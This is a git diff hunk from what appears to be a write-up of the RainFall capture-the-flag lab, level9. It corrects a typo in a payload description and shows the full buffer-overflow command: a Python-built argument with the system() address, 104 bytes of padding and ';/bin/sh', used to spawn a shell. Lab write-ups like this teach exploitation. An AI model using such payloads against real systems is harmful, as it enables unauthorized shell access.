@@ -75,7 +75,7 @@ Breakpoint 1, 0x0804867c in main ()
 3) offset: **108**
 
 
-The payload will be sent to the binary as an argument and will be structured like - **address of system (4 bytes) -> padding of 104 bytes -> address of eax register -> ";l/bin/sh" as a argument for system()**
+The payload will be sent to the binary as an argument and will be structured like - **address of system (4 bytes) -> padding of 104 bytes -> address of eax register -> ";/bin/sh" as a argument for system()**
 ~~~shell
 level9@RainFall:~$ ./level9 $(python -c 'print "\xb7\xd8\x60\x60"[::-1] + "a" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh"')
 sh: 1: 
